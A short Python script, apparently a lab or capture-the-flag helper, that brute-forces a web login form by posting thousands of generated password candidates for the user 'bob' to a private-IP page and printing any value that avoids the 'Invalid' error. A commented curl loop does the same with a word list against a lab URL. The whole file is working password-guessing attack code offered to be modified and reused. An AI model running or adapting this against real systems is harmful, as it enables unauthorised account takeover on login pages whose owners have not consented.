# easy request
# can be used for password brute force or to predict other token
import requests

def get_response_code(datafield=[], urI="http://10.10.10.10/index.php", theErrorIs="Invalid", key="password"):
    for value in datafield:
        response = requests.post(urI, data={"username": "bob", key: value})
        if theErrorIs not in response.text:
             print(f"[+] post data: {key}={value}")

#modify to your needs
def generate_input_data():
    numbers = [str(i).zfill(3) for i in range(1000)]
    letters = [chr(i) for i in range (65,91)]
    return [f"{n}{l}" for n in numbers for l in letters]


if __name__ == "__main__":
    get_response_code(generate_input_data())

# simple redirect check using a list of parameters
# for key in $(cat list); do printf "\n[i] param: "$key"\n" >&2; curl -v http://10.112.167.162/labs/lab1/index.php -H "Content-Type: application/x-www-form-urlencoded" -d "username=Mark&password="$key; done 2>> "post_delay_$(date +%Y%m%dT%H%M%SZ).log"
#
